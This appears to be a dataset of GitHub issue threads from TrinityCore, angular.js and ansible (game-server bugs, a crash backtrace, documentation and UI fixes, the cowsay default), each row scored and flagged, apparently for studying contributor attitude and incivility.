TrinityCore/TrinityCore/20714,0.096154065,TrinityCore,TrinityCore,Anub'rekhan not linked to his Crypt Guards.,3990,41,41,0,0,"Description If I am inside Naxxramas, I can pull one of Anub'rekhan's Crypt Guards without aggroing the other Crypt Guard or Anub'rekhan himself. Current behaviour It is possible to aggro only Anub'rekhan or one of the Crypt Guards if we aggro them from the side. Expected behaviour Pulling any of the Crypt Guards or Anub'rekhan himself will result in all of them getting aggroed. Steps to reproduce the problem  CHANGEME Step 1 include entries of affected creatures / items / quests with a link to the relevant wowhead page.   Step 2 Step 3  Branch(es) 3.3.5, I don't know which branch TC rev. hash/commit TrinityCore rev. 607034064f04 2017-10-07 171334 +0200 (3.3.5 branch) (Win64, RelWithDebInfo, Static) (authserver) TDB version  TDB_full_world_335.63_2017_04_18 Operating system Windows 10  Is it normal, Crypt Guards appears only on 25man?  So I should post the top one which you said will work in the querry, or will it be updated in the official TC?  One more thing @friend, the query you added does work if Anub'rekhan is pulled first, however it does not work if his Crypt Guards are pulled first, I can still pull each one of them from the side, kill them and then engage the boss without adds at the start.  No this must be fixed in core side, also when you pull the boss a set combat with zone is called and the 2 guards will enter the combat.  Maybe @friend would like to pick up the challenge to see if he can find out what can be done about that action in the SAI core source?  It would be incredible if someone could start working on this issue, since it creates a lot of problem in MC and sub-raids on my server which is  hosting vanilla as end-game content, is there a forum where I can ask some more complicated questions about TC?  Was digging into this issue earlier, call for help only works when creature has a victim so its kinda buggy for some reason when used with aggro event (didnt have time to check why, through) You can use SET_IN_COMBAT_WITH_ZONE (38) with target CREATURE_GUID (10), but it may be a bit of a hack.  The easiest way is to delay the call of help by 1 secs.  @friend I think thats even more hacky solution than mine tho D  @friend maybe not - it might sound strange, but in some of my almost expired memories from WotLK retail I recall creatures waiting 1-2 seconds before answering a call for help P  @friend alright, fair enough, still weird tho  Yes it makes sense the text is displayed then after 1-2 secs npcs will enter combat.  Just put call of combat with boss, when Crypt Guards enter in combat (you can do it using EnterCombat(Unit* who) in a ScriptedAI)  Yes but in this case the SAI action mut be fixed.  Will an issue like this be fixed in the 3.3.5 branch or will I have to do this manually?  Ideally it will be fixed in the TC source (3.3.5 / master), but it depends on someone coming up with a working solution.  One solution would be to add second optional parameter victim to CreatureCallForHelp. If noone comes up with better solution, I will open a PR with it.  Why nobody talks about formations? D  Sometimes you can't put creatures into formations like when they already are in one or, in this case, they're temporary summons  That's why I had a feeling that I am stupid and missed something, because four days and nobody's talking about formations.. there must be a reason.  I'm new to Trinity, but how many people are working on it?  Since working implies, by definition, some sort of revenue, 0  Yes, it all depends on how you define ""working"" or what you actually want to know. There is a certain number of members in the TrinityCore organization, but some are inactive and some are more active than others. And like ccrs said, none of them receive a salary.  If you wanna pay me a full-time job I'll gladly work on this silly project. Until then, you get fixes when they happen.  closed by 79f0e55  Apologies for the attitude in the past @friend , I didn't want to come off that way, I'm very grateful for the fix! ",27,0,143,0,0,165,8,n,
TrinityCore/TrinityCore/4603,0.057464323,TrinityCore,TrinityCore,[GDB] Crash at Unit::IsIMmunedToSpellEffect,4377,19,216,0,0,"Hello, I have this crash recurrently  0  UnitIsImmunedToSpellEffect (this=0x7fff572a7000, spellInfo=0x7fffe8c8b800, index=0) at /home/game/origins/compil/darluok/src/server/game/Entities/Unit/Unit.cpp11546     aura = 3     effect = &lt;value optimized out&gt;  1  0x0000000000b4d3d6 in SpellAddUnitTarget (this=0x7fff2cc61b00, target=0x7fff572a7000, effectMask=3, checkIfValid=&lt;value optimized out&gt;) at /home/game/origins/compil/darluok/src/server/game/Spells/Spell.cpp956     targetGUID = &lt;value optimized out&gt;  2  0x0000000000b5f287 in SpellSelectEffectTargets (this=0x7fff2cc61b00, i=0, cur=...) at /home/game/origins/compil/darluok/src/server/game/Spells/Spell.cpp2506     maxTargets = 0     pushType = PUSH_DST_CENTER     modOwner = 0x7fff7f44b000     effectMask = 3  3  0x0000000000b60577 in SpellSelectSpellTargets (this=0x7fff2cc61b00) at /home/game/origins/compil/darluok/src/server/game/Spells/Spell.cpp717     implicitTargetMask = &lt;value optimized out&gt;     i = 0     processedTargets = 0  4  0x0000000000b61468 in Spellcast (this=0x7fff2cc61b00, skipCheck=true) at /home/game/origins/compil/darluok/src/server/game/Spells/Spell.cpp3173  No locals. 5  0x0000000000b62b20 in SpellEventExecute (this=0x7fff2da38af0, e_time=2349594, p_time=0) at /home/game/origins/compil/darluok/src/server/game/Spells/Spell.cpp6523  No locals. 6  0x0000000000ceba3f in EventProcessorUpdate (this=0x7fff7f44b280, p_time=342) at /home/game/origins/compil/darluok/src/server/shared/Utilities/EventProcessor.cpp47     Event = 0x7fff2da38af0  7  0x00000000008fb56c in UnitUpdate (this=0x7fff7f44b000, p_time=1462399696) at /home/game/origins/compil/darluok/src/server/game/Entities/Unit/Unit.cpp302     __FUNCTION__ = ""Update""  8  0x000000000097e2d5 in PlayerUpdate (this=0x7fff7f44b000, p_time=342) at /home/game/origins/compil/darluok/src/server/game/Entities/Player/Player.cpp1542     now = &lt;value optimized out&gt;     pet = &lt;value optimized out&gt;  9  0x0000000000a641b6 in MapUpdate (this=0x7fffdfa5b000, t_diff=342) at /home/game/origins/compil/darluok/src/server/game/Maps/Map.cpp537     player = 0x7fff7f44b000     updater = {i_timeDiff = 342}     grid_object_update = {i_visitor = @friend}     world_object_update = {i_visitor = @friend}  10 0x0000000000a72381 in MapUpdateRequestcall() () No symbol table info available. 11 0x0000000000ce6911 in DelayExecutorsvc (this=0x7fffea3a3b40) at /home/game/origins/compil/darluok/src/server/shared/Threading/DelayExecutor.cpp52     rq = 0x7fff6efb3790  12 0x00007ffff76f1d47 in ACE_Task_Basesvc_run (args=&lt;value optimized out&gt;) at ../../ace/Task.cpp275     t = 0x7fffea3a3b40     svc_status = &lt;value optimized out&gt;  13 0x00007ffff76f30d1 in ACE_Thread_Adapterinvoke (this=0x7fffd6a1ed00) at ../../ace/Thread_Adapter.cpp98     exit_hook_instance = &lt;value optimized out&gt;     exit_hook_maybe = {instance_ = 0x0}     exit_hook_ptr = &lt;value optimized out&gt;  14 0x00007ffff5fa18ba in start_thread () from /lib/libpthread.so.0 No symbol table info available. 15 0x00007ffff5d0902d in clone () from /lib/libc.so.6 No symbol table info available. 16 0x0000000000000000 in ?? () No symbol table info available. Patch  wintergrasp Revision  57490ead833074bd83ae38be8ee50e9f9813759a  I suggest a firewall (at least software) for your server, it's really vulnerable.  Why ? I didn't get the point.  Custom fixes or maybe a pull request implemented like for example the Immunity handling?  No big custom fix, I've added some more immunities to Vehicles, but in the way Trinity dev have already done.  do you know if I desactivate GCC optimisation, I will have the targetGUID and the spell/aura ID?  (and what is the relationship with a firewall...!?!)  I'm saying that your french private server doesn't have a firewall and it's easily crashable / hackable ;)  /home/game/origins/compil/darluok/src/server/game/Spells/Spell.cpp Nothing more to be said.  ¬´  francophones, gratuits &amp; l√©gaux World of Warcraft ¬ª  PUBLIC SERVERS ARE ILLEGAL BY ESSENSE  Please shut up. Thanks. (~&gt;Mods)  no one appreciates that kind of attitude. the people here work hard to get these things working and most if not all private servers benefit from it without giving much if anything back in return.  the most funny thing is they just know how to install a server and wait the money darluok, making money at it best. ",1,0,407,0,0,187,8,y,
TrinityCore/TrinityCore/6137,0.08389727,TrinityCore,TrinityCore,[LOOT/FIX] Brightly Colored Egg (45072),4347,61,52,0,4,"this is already in the database thus does not require adding  I'm currently not using the latest DB so I can't be certain they ware fixed but I don't remember seeing the fix and the values are different in my version.  @friend what part of the code below would you say is already in the DB? Do compare the values from my fix above with the values from the current DB below before you answer. Please reopen the issue since it is obvious the drop chance values are wrong in TDB 11.46 updated to e74135946d2cb2b6a522cfa979cfef0263a9fd8e and this can be confirmed by the link I provided in the first post.  The drop chances that are in DB atm are very similar... 0.6 vs 0.5, 0.5 vs 0.4  Yet they are wrong enough to need fixing &lt;IMG&gt; If you, in-game, can tell that an item drops 0.2% more using a different DB... I don't even know what to say. Minimum is 0, maximum is 100 and we are arguing over decimals... Thanks for the fix but I think our time would be better wasted with something more serious.  I give up, when I was told by others they won't post there fixes here because of the dev's attitude I did not understood them. Now I think I finally do understand ... You just told me that you don't care that the ""Elegant Dress"" (  ) doesn't have the same chance to drop as Spring Rabbit's Foot, Spring Circlet, Spring Flowers and Spring Robes (they should have the same chance) just because you don't think it'll have any difference for the players if the value is 0,3% less than is should be... You also told me that you don't care if the values in TDB are not correct and won't apply a fix because you consider it a waste of time.  That means you can't accept a no? Look at the god damn values again and tell if it is worth it, and why.  You are constantly rejecting fixes because they are not blizzlike, yet now you are rejecting a blizzlike fix because you think that the difference in the values is not big enough ... But the result is that players are wasting hours farming the ""Elegant Dress"" item during the 1 week Noblegarden event in hopes of getting the ""Dressed for the Occasion"" achievement year after year and can't get it while getting multiple copy's of the other 4 items that are supposed to have the exact same chance to drop ... Do note that while minuscule in terms of 0-100% the difference in drop chance is 250%  Constantly rejecting fixes? Do you have anything to back that statement? And what makes you think that your values are more correct than the current ones? I don't know if our values are correct either but since they are already in the DB and your changes introduce no significant changes, I (we) are not pushing it. Wowhead is based on empirical data, it is not a reliable source of data. There's no good way to get the exactly correct values (except for those loot table where you have, e.g, 10 items in a group and you know that one of those items has to drop) And about the 250%, I think your math is a little bit off. I would not like to continue this useless and stupid discussion.  nelgalno if you wish to change %'s then post udate queries. above fix is not needed thus rejected.  &lt;b&gt;Do you have anything to back that statement?&lt;/b&gt;  what makes you think that your values are more correct than the current ones?&lt;/b&gt; I did some research before posting here as evidenced by the links above. &lt;b&gt;And about the 250%, I think your math is a little bit off.&lt;/b&gt; 0.2 + 0.3 = 0.5% == 100% + 150% = 250% &lt;b&gt;post udate queries&lt;/b&gt;  yes the loot% on your thottbott, wowhead and other links are all momentairy, i challenge you to check it again in 2 weeks or even in 5, and see that the %chances have changed yet again. therefor you should NOT use hardcoded ChanceOrQuestChance but group them accordingly and set a rough chance for them as a whole. 0.2+0.3 = 0.5 (that is correct) but the increase in % = 0.3/0.2 = 150% not 250%  fix is rejected, my final statement, and im the loot dev  They held those values since the time of the Noblegarden event == more than a month ago ... If we assume that the current TDB value is 100% + the 150% increase I suggest equals 250% ... P.S. I don't care, it is your choice to accept or reject the fix. I know that I did my best to provide the information/evidence that the values in TDB are incorrect and you choose to ignore it ... ",14,0,204,0,0,99,7,y,
TrinityCore/TrinityCore/7994,0.070149219,TrinityCore,TrinityCore,Arena frames ,710,1,6,0,3,"When you use addons like Gladius and enter to an arena before your teammates, they appear in Gladius like they were your enemies. Also happens with blizzard arena frames. Same problem ‚ô¢  rev. 2012-10-05 233116 +0200 (ca55807+) (Unix, Release)  Confirmed! Revision a7d8a65bd0a95f21f1e350cefbef94ace20f69ec Database TDB.335.49 (with latest updates)  Confirmed!  Confirmed.  CONFIRMED!   will fix it, only makes sense that way anyway imo BattlegroundMgr.cpp  Working partially on a261231d3f345eb4cf4e4601cd1dba1506d6f989 Now only pets bug the partner interface (owner interface works fine), and the rest it's fine  confirm, frame is bugged in rev  Reopen this, confirm at 5a6eacfa3361c87c776915204caef9be2851486e ",1,0,29,0,0,29,3,n,
TrinityCore/TrinityCore/8105,0.07455975,TrinityCore,TrinityCore,[4.3.4] Update object and player - player visibility,13188,90,162,0,6,"Core revision  7cc1b999a6f69056e88ffce04d2f26de292a6e11 Description  Console error with Object Update Failed between players, resulting in player being invisible for others. Happens randomly and sometimes whole packet is skipped for that player. All other objects are visible. Did some testing on it and seems sometimes logging out both players which don't see each other solves it, sometimes a server restart and other times changing the location of both players can do it. This can happen in two different ways  if there is only player a and b player a doesn't see player b or other way around /  both players don't see each other; if there are more players some players can see that player  but for some object update fails and they can't see him at all / player can't see some of the other players.  Example Object update failed for object 436 (–í–æil) for player Leikov (213) Object update failed for object 32 (–úentos) for player Leikov  (213) Object update failed for object 184 (Larvy) for player Leikov  (213) Object update failed for object 234 (–úilna) for player Leikov  (213) Object update failed for object 1373 (Wilson) for player Leikov  (213) Object update failed for object 1391 (Death) for player Leikov  (213) Object update failed for object 234 (–úilna) for player Leikov  (213).  This seems to happen also for pets, totems or in case of raid buffs. Maybe it is aura-related in some way? Anyone got anything new on this?  confirmed  Could this be due to limitation of player update fields sent to other players ( I mean these commits  /  ? I played around with it a bit and observed that modifying the number of update fields sent / sending them all can reproduce the bug each time two or more players meet, can something be bad there ?  Seems to be a wrong packet structure being send i think, if you check it handles the CMSG opcode that is being received and calsl the object failed. Soooo this could be because the packet has been sended wrong?  @friend prolly not. Objects/Npcs keep disappearing as well once 2 or more players reach in sight.  any temp solution?  None that I know of as of now ;(  anyone can help me, does it possible to make in game command, witch can repop player update? so it basicly make ppl visible if they use that command?  Still wondering who is assigning issue priorities.. Without object update working as intended there's no way to even play the game,but it's better to have spells as a higher priority..huh.  You are NOT supposed to use the 4.3.4 branch for production environments, it IS in alpha / beta state, and WILL have bugs. We (devs) work on whatever we WANT to work on, whatever is FUN for us to work on, not on some ""important"" bug because it prevents people from creating 4.3.4 private servers  I don't really care,I've fixed that on my local. Just wondering of whom is assigning priorities no matter the branch's current state as he clearly isn't paying attention or is just ignorant. I didn't say that I expect the 4.3 branch to have no bugs,master has enough already,anyways. And this isn't stopping anyone(or at least me) to get my stuff rolling ;)  @friend What exactly are you doing here? With that shitty attitude you might as well just leave.  please just be cool anyway hopefuly some devs can look at this, could be nice to have it fixed and IntelFreak share fix? or ..  You know, that makes us want to stop developing sometimes, you take tons and tons (thousands of lines, according to ohloh) of code, made by us / other contributors, modify it, claim that you have something working, and just don't share it back.  I do not care about any other user here weaving around aboot some fixes here they made that none of followers of TC can experience. It's crap, it's ignorant and it really ain't nice. I want to just let my fav db dev know that he is best at his work around here, Malcrom D  Would be nice if you mentioned exact steps to reproduce this as i had a hard time trying to figure it out. Im guessing more than 1 player must be involved so i can't test it alone.  one problem i can reproduce ,  player A duel with player B player A mage cast invisibility, player B stays without move after player A invisibility fades, player A cant see player B until player B move. thats just one visibility bug, but trying to find out other (perma invis until relog) bugs  that bug with invisibility seems fixed on latest rev, not sure about global player update visibility  @friend can you pls share your fix?  just to confirm bug still there ERROR [NETWORKIO] Object update failed for object 100037876 (Rychard) for player Abnormally (606513) ERROR [NETWORKIO] Object update failed for object 100037876 (Rychard) for player Wlk (586392) ERROR [NETWORKIO] Object update failed for object 100037876 (Rychard) for player Agressive (351952) ERROR [NETWORKIO] Object update failed for object 606513 (Abnormally) for player Rychard (100037876) ERROR [NETWORKIO] Attempted to get value with size 3 in ByteBuffer (pos 2 size 16) [Stack trace /opt/RC_TC/bin/worldserver(_ZN12WorldSession6UpdateEjR12PacketFilter+0x8f0) [0xd30000] /opt/RC_TC/bin/worldserver(_ZN5World14UpdateSessionsEj+0x112) [0xdcd0e2] /opt/RC_TC/bin/worldserver(_ZN5World6UpdateEj+0x227) [0xdd2667] /opt/RC_TC/bin/worldserver(_ZN13WorldRunnable3runEv+0x1b4) [0x8de414] /opt/RC_TC/bin/worldserver(_ZN9ACE_Based6Thread10ThreadTaskEPv+0xa) [0xfd681a] /usr/local/lib/libACE-6.0.0.so(_ZN21ACE_OS_Thread_Adapter6invokeEv+0xa5) [0x7f99af463f75] /lib/x86_64-linux-gnu/libpthread.so.0(+0x6d8c) [0x7f99add9ad8c] /lib/x86_64-linux-gnu/libc.so.6(clone+0x6d) [0x7f99adae4fdd] ]  I got this messages when tryin to tame beast (mb cuz last id in character_pet table is rly big?) =) If truncate tables character_pet / pet_aura / pet_spells / pet_spell_cooldown - everything going well...  still bug, please fix it  lol, go to AC webs and bump.  is it caused by some commit or that problem is from start?  can someone send file with packet communication on this error? i cant reproduce it on localhost -(  can use this for sniff it works ok  i could not 100% reproduce the error msg, but after some testing i figured out a stupid bug if you JUMP thru any portal client will stuck at loading screen. I didnt get any error msg for this however. anyway, problem is at Object_BuildMovementUpdate temp solution is to disable jump flags in the update object just comment these two lines hasFallDirection = self-&gt;m_movementInfo.bits.hasFallDirection; hasSplineElevation = self-&gt;m_movementInfo.bits.hasSplineElevation; (it can be found in two places, just below each other) after this, client loading didnt stuck anymore while jumping to portals..  so jumping while teleport makes you stuck? (someone tryed to reproduce this with jump + .tele? D  tryed it with tele to other map, no errors, but with jump + instanceportal its a 100% stuck for us  Confirmed, sometimes also seen on master.  still could not directly reproduce this update fail bug... it comes back randomly tho..  sniff with data fail (btw you can enably packet logging in core.. no need for sniffer in local..)  with wpp and search for CMSG_OBJECT_UPDATE_FAILED  @friend is easy to fix it, you need get some functions from update visibility from cmangos (they have implemented, Trinity no), and make some changes for get working it.  Walkum thx for help  @friend that is where you need to fix? Help please. Thank you.  share fix, please... (  also looking for solution /  yeah,  i want to know what code walkum said.  @friend Could you please link to this code or pm me?  Object update failed for object 17371279370823581417 (Doodad_InstanceNewPortal_Purple01) for player Mags (27) Object update failed for object 17371279375118548714 (Doodad_InstanceNewPortal_Purple_Skull01) for player Mags (27) Only I have left?  this partially fixes visibility, Creatures still sometimes, well a lot of the time don't load up on login/teleport. as well as game objects and players. However players seem to pop up out of the visibility issue over time when they move around/cast w/e.  How to repeat 2 players. player1 .tele gmis player2 .tele zula player2 .sum player1 and immediately press jump PROFIT! )  player 1 or 2 jumps?  For me, Spawn creatures on gm island = when you tele there or login creatures are invisible until you do .respawn.  yep, problem is still here.  problem still exists afaik... and another way to reproduce, set all speeds to 0 in any creature_Template, it will write the update error  Speeds equal to 0 should not be allowed for any object - client explicitly rejects such objects  thats fine but in tdb some creatures (cannons?) have speed 0 so players can not move with them. anyway, after cleaning the db of 0 speeds, the update fail error still happens, sometimes for 1 unit, whole instance, or  even for self. i made some changes to the core, all smsg_update_objects packets get stored in vector for each player, and when a player gets the failed error it dumps all packets to a parsable bin file,   it clears the packet list after all smsg_new_world packets (when teleporting) to minimize the number of packets saved. i'll run this for a while then upload the bins here. example Object update failed for object 17379573901861019520 (Orgrimmar Thief) for player Rodneey (8515)  was only 1 SMSG_UPDATE_OBJECT packet in his dump which had the entry of Orgrimmar Thief UNIT_FIELD_HEALTH 0/0 this looks strange to me... how ever, i could not reproduce the bug, the creature has &gt;0 hp in db  updates_8515_parsed.txt Object update failed for object 17379573901861019520 (Orgrimmar Thief) for player Rodneey (8515) (Unit Entry 42594 Low 1269632 is the npc) updates_27473_parsed.txt Object update failed for object 17379456185396262882 (Murky) for player Tfh (27473) (Unit Entry 15186 Low 161762 is the npc) updates_157003_parsed.txt Object update failed for object 155636 (Flink) for player Chupakabra (157003) updates_153694_parsed.txt Object update failed for object 140454 (Misral) for player Tapolynokill (153694) updates_146553_parsed.txt Object update failed for object 157256 (Tokitozuka) for player Enforced (146553) updates_105663_parsed.txt Object update failed for object 128558 (Epherandes) for player Manigo (105663) updates_122856_parsed.txt Object update failed for object 155636 (Flink) for player Smash (122856) the bugged packet is always the last one in the files zip bins + parsed with wpp, no parse errors  Your method of debugging this is not reliable - client sends CMSG_OBJECT_UPDATE_FAILED when it received VALUES block for an object it cannot see (didn't receive CreateObject or movement block had bad data); this means it will never fail because of bad values in updatefields  okey, then why arent the create packets sent corretcly?  The packets sended correctly, but if you send not allowed values by client side in the SMSG_OBJECT_UPDATE (e.g speed=0) the client ignore this object and send to server  CMSG_OBJECT_UPDATE_FAILED, but the problem is fixed, check your database and change the not allowed values to not receive this error  as i wrote above, there is no npc with speed 0 in db, and most of the errors come from players, i dont think they can have 0 speeds...  What about players that have auras with -100% movement speed? Maybe we are handling these wrong  No ^^ it's auras which handle Movement ) For ex. Suspend gravity! How do i know? Because i'm working on gunship_battle 4.3.4 and everytime i use movement flag i get that error ^^ Like when you enter the Transport you actually do get an Spell (Aura), that says, that you'r eon the Transport and then it wants to update  If you have a new way to reproduce it, why don't you tell us what it is?  didn't i do that before? Try any Spells, which will update the movement of anything..  No, I am not getting issues with them, you could at least give me a scenario how to cast it, what to cast, who to target and stuff  shauren was right, any speed mods which set speed to 0 create errors.. expample spell 102937 Demon Grip Root - 100% speed to reproduce add aura 102937 to a player (should work winth any unit tho) run/fly out of view distance of it go back you will notice that most of 'worldobjects' which were sent in the same packet are not visible you will get the first update failed error if any of those objects send an update example a player unequips an item  btw, why is this closed?  did some more tests i logged all speed vars in all create packets, none of them was 0, so this isnt to source of the bug (adding -100% speed auras still reproduce the error, but those are not used in TC currently for any scripts afaik) another thing i tried is, i added a check when core receives the fail packet, and checked m_clientGUIDs for the given guid and m_clientGUIDs always had the guid in list, so the bugged object is always visible from core side for the player so i guess somehow the createblock is not sent to the client any ideas?  Maybe an error in the order the packets are sent, or they way they are processed by the client? as in, we send the CreateObject first but the client processes the UpdateValues before it?  i still dont know why is this closed, the bug is still happening as before.. ",41,0,604,0,0,500,32,y,
angular.js/angular/1438,0.052317907,angular,angular.js,Broken sample code: http://docs.angularjs.org/api/ngResource.$resource,4387,46,17,0,2,"The sample code for  is broken. See the first comment for a fix     You must reference the angular-resource js script file.    Then you must declare a module dependency on     'ngResource' via angular.module('myapp', ['ngResource']).  This URGENTLY needs to be fixed.  People keep getting stuck on this issue.  Yeah, count one more person who wasted time on this. You can eventually figure it out by searching around the net and reverse engineering other peoples code )  plus one, just lost an hour wondering about this too.  Ran headfirst into this one as well.  plus one me too. Thanks  It's open issues like this that make me wonder if I should continue developing with Angular. I mean this with 100% respect for what you all have accomplished here.  I'm just trying to point out that documentation is really important for people like me who are trying to choose which framework to use.  Fork. Branch. Fix. Pull request?  So, had a look at this example and it is broken in number of ways, in addition to the ones already listed  It is still using old controller syntax ( instead of ) We are missing a module with a resource created in a factory Google buzz is gone ( so the example must be changed anyway  I don't know, if there are no other ideas we could simply change it to the projects list from the home page..  why are you doing this to us?  Angular.js has over 700 closed pull requests. Just saying.  but this is really urgent. I couldn't find any advanced example for $resource.  Normally I agree with the philosophy if you find a problem why not propose a solution. However this is one of the first things people new to angular are trying to grok. They are thinking more WTF rather than how can I fix this.  Let them get through hello world before expecting pull requests.  I went through hello world 6 months ago. I have made 3 productive angular apps, yet I spent a full day trying to figure out how $resouce works basically. WTF  @friend @friend I sympathise completely, it's always fair to raise a ticket to ask an expert to fix a problem. What's not fair (or helpful) is the attitude that ""WTF"" conveys. This is free software, built with the time and creative energy of individuals who ask for nothing in return. They deserve a little better than ""WTF"", don't you agree? When I hear that attitude my gut reaction (that I do usually restrain) is ""fix it yourself"".  I apologize. I was unrightfully  provoked. Sorry!  Yes Richard you are right. I guess a bit of frustration comes from not having more access to what the core team is thinking.  Not for our curiosity but because it would help us plan ways to help the project.  Are any if the core team working full time on Angular?  (if they have only 10% allocation we can optimize our help for this)  What are they currently working on or starting in the near future?  (sparse commits and roadmap don't tell much)  How do we contact them?  Does Igor list his email?  I am trying to help fix a bug in the core code and need to coordinate but haven't gotten a response via GitHub or google groups.   Leaders of a free project do deserve our respect and thanks.  The flip side is they have to spend time on communication, coordination, and leadership, or delegate it.  The more the path is lit the more the community can help. On Jan 9, 2013, at 414 AM, ""Richard Marr"" notifications@friend.com wrote  Fair enough!  Something as basic as $resource should be properly documented. WTF is the appropriate reaction. Fixing it yourself is too.  I would like to contribute more appropriate documentation and samples, but I couldn't figure how to make the sample code pipeline work. On Wed, Jan 9, 2013 at 942 PM, Iwein Fuld notifications@friend.com wrote  kmayer cool! What do you mean by ""how to make the sample code pipeline work""? Is it related to the Angular build, or to the code that is in the current sample? I think that you can best ask in the mailing list, there is quite a bit of activity there.  This should have been closed 3 months ago together with Pull Request #2099 . Here an screenshot showing this info on the current docs of ngResource.$resource     As part of our effort to clean out old issues, this issue is being automatically closed since it has been inactivite for over two months. Please try the newest versions of Angular ( and ), and if the issue persists, comment below so we can discuss it. Thanks! ",17,15,147,0,0,118,13,y,
angular.js/angular/4401,0.045961367,angular,angular.js,ngShowDirective adds the ng-hide-remove class when the element is already hidden,5387,63,80,0,8,"ngShowDirective watches attr.ngShow, and adds ng-hide-remove class even when the attr.ngShow value ""changes"" from true to true (or from false to false). Animations should only be applied if the actual value of ng-hide has changed if ( toBoolean(value) !== toBoolean(oldValue) ) {   $animatetoBoolean(value) ? 'removeClass'  'addClass'; }  I can't reproduce the problem here  - Can you modify the Plunker to demonstrate the issue?  Thanks, @friend.  Great idea! This reveals the issue, when you type in the new text field I added.   P.S. I'd be happy and honoured to submit a pull request for this issue if you like -)  Hmm... actually, my na√Øve solution doesn't work - the ng-show directive wouldn't initially add the ng-hide class (since value and oldvalue are both ""undefined"" at the start, so the boolean value doesn't look like it's ""changed"".  Needs more thought...  @friend how's this coming? I can make a quick PR towards the end of the week unless you're still on this.  I'm a bit stuck, to tell you the truth. My fix (above) only works for ngHideDirective, and that's only because of an accident - namely that if the initial toBoolean(oldValue) is false, this matches the fact that we haven't yet added or removed either of the ng-hide-add and ng-hide-remove classes; hence doing nothing is appropriate. The ngShowDirective is more complicated.  If value and oldValue are both initially ""undefined"" or falsy, we must take action to add ng-hide, even though it doesn't seem like the model has changed.  Otherwise '''&lt;span ng-show=""undefinedValue""&gt;''' will fail to be hidden at start up. Is there a way to tell if this is the first time the $watch() function has been called?  Then we could do this ''' var ngShowDirective = ['$animate', function($animate) {   return function(scope, element, attr) {     scope.$watch(attr.ngShow, function ngShowWatchAction(value, oldValue){       if ( isFirstTimeThisWatchHasFired || (toBoolean(value) !== toBoolean(oldValue)) ) {         $animatetoBoolean(value) ? 'removeClass'  'addClass';       }     });   }; }]; ''' Any ideas?  You could try to define a variable outside of the watch and check if it is true. Also take a look at $compile to see if you setup the addClass/removeClass guard there  Thanks @friend! I'm embarrassed that the solution is so obvious -)  I added the local variable, and it now works as I'd expect.  I'll send a pull request ASAP.  Not sure how to add tests for this feature though.  Any advice?  A good place to start is with  Just add another speak and try to use the mocking system that the two existing tests are using. To run tests, do the following  npm install ./node_modules/.bin/bower install grunt autotest  Then when everything is passing and your code is ready to go, try the following  grunt test  After that change your commit message style to follow AngularJS' style Take a look at some of the commits here  @friend how's this coming along? Do you need me to help out in any way?  Hi @friend. I've sent pull request #4479, and I think I've formatted it correctly now (my first ever pull request - very exciting stuff!) I just had a brief holiday in Sydney, so haven't had a chance to write the tests.  Also, I've never written unit tests in the framework used in Angular.  I'd be keen to try, and from the looks of things, this is a fairly simple example to get started on. I've been reading up on how to test code like this, and it's a great way to get deeper into how Angular works, so if there's no rush to get this fixed, I'd be happy to tackle the tests.  I've got a huge stack of work to catch up on, though, so it won't happen this week.  If you have the time and the inclination to write the tests, I'd be happy to learn from your example - I'll use the lesson to fix something else in the Angular code base -)  @friend no problem. I can handle the tests. I'm trying to close just about all the animation PRs before 1.2 is released.  @friend great work for fixing this with ngShow/ngHide. Turns out that after looking more into the problem, $animate is causing the issue and the CSS class checking has to occur inside of it. So the solution has to fix it for all cases. The ngShow/ngHide PR you made only works for that one ($animate.addClass / removeClass was had this issue to begin with). Here's the new PR  a working version of your demo with the new PR  for closing your PR on this. Thank you for putting the work into it.  Thanks Matias -) Interesting.  My first thought was to check hasClass(), but that felt DOM-centric and implementation-specific.  I was afraid I was falling into my old jQuery habits (storing ""model"" in DOM) -)  That's not a criticism; I think the area that you've amended is at the same level of abstraction as the fix you've added.  It felt awkward to add class-level checks inside the ngShowHide.js file though. I like how simple the general solution is now. Thanks so much for your help and encouragement with this - I've really enjoyed the experience.  It's my first contribution to OSS, and thanks to you and your kind and helpful attitude, I'm definitely going to do more! Grant On 24/10/2013, at 954 AM, Matias Niemel√§ notifications@friend.com wrote  @friend happy to hear that the fix is good. And thanks for the feedback about the OSS stuff. I'm happy to help. Keep contributing! You learn a lot when working on an open-source project.  Landed as ",18,13,316,0,0,171,16,n,
ansible/ansible/10530,0.093711257,ansible,ansible,Cowsay should not be enabled by default,3278,50,25,0,1,"Having cows fill my screen when running a playbook is not the expected behavior, and makes it hard to visually parse the output of ansible. Since cowsay is enabled not by a setting, but just by the presence of the cowsay binary on the system, it is a surprise whether or not cows will appear when I run ansible-playbook on a new system. Instead of putting the burden of setting an environment variable on people who don't want cows, the default should be normal text output with no cows. The environment variable should be renamed from ""ANSIBLE_NOCOWS"" to ""ANSIBLE_COWS"". This way, we get a sane, unsurprising default, but people can still get their cows if they so desire.  Pure heresy, I say!  wink  I don't see what the problem is here. If you have cowsay installed, you obviously want to use it. If not, you'd uninstall it.  plus one I have a recurring nightmare of demoing a new CD system to all of engineering and having cows fill my screen and getting fired.   Just wanted to point out one thing that I wasn't sure if the original poster noticed In ansible.cfg you can set if you would like to set this in your environment, just set the configuration option in the ansible.cfg file.   I agree this is very annoying. I also think your attitude towards this very disappointing. Yes, this is a fun feature. But it's fun exactly three times, then you realize your ansible output is now basically unreadable. I can set it in a config file, yes, but when using e.g. a pull configuration, this isn't really an option. I have to ensure to enable an option in a config file on every host that might ever run some ansible command, just so I can get rid of some easter-egg I never even enabled in the first place. Isn't ansible supposed to make our lives easier? Maybe consider the fact that many people complain about it and even send PRs as a sign that this is annoying to many people, and please reconsider disabling it by default.  Hay there. I'm moo here. I herd you mooved on, but cowbell we re-open this issue. Stop hoofing around, I think you've milked this joke long enhoof. Please remoove this behavior, I beg of you, leather you like it or not, it's caused issues even though there is no farm intended.  I was calfway through provisioning my EC2 servers and this bull appeared. But I digrass, this joke is the worst I'd heifer seen. It's the last straw. I've got no beef with you, but cattle you see that people are upset?  Please reconsider. Bessie of luck to you all.  A co-worker (not cow-orker!) suggested I weigh in on this thorny subject.  You should be careful with features like this they can ruin product demonstrations if they fire off unexpectedly.  Many years ago I was demonstrating something in Linux.  I had to use sudo and I got one of the joke responses that it used to give when you mistyped your password.  'Oh yes, the err, author, does have a bit of an, um, sense of humour.'  It's unexpected so you've got nothing prepared, and it makes it look as though the product designers are not taking their role seriously.  I know that both Ansible and sudo are serious products, but my audience may not.  My biggest beef with this is that the beef takes way too much vertical space. Having it default to off would be preferred.  I see what you did there... ",15,2,109,0,0,85,4,n,
